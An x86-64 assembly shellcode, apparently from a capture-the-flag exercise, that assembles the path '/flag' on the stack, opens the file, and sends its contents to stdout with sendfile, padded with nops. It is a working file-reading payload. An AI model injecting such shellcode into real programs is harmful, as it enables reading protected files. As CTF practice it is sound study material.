        .intel_syntax noprefix
        .global _start
        .text

_start:
open:
        // open 
//        xor rax, rax
mov ax,2
nop
nop
nop
nop

//
        //const char __user * filename
        mov r10, 0x67616c66
nop
//
        shl r10, 32
nop
nop
nop
nop
//
        add r10, 0x2faaaaaa
nop
//
        shr     r10, 24
        push    r10
nop
nop
//
        mov rdi, rsp
        // int flags
//        xor rsi, rsi
        // umode_t mode
//        xor rdx, rdx
        syscall
//

        push rax
        nop
        nop
//

sendfile:
        // size_t count
        mov     r10, 123456789
        nop
//
        // loff_t__user * offset
//        xor     rdx, rdx
        // int in_fd
        pop     rsi
        // int out_fd
        //xor     rdi, rdi
	mov rdi, 1
        //nop
//
        //inc rdi
        mov     al, 40
        syscall
        nop
	nop
	nop
	nop
//

exit:   //exit
        mov     al, 60
        xor     rdi, rdi
        syscall
        nop
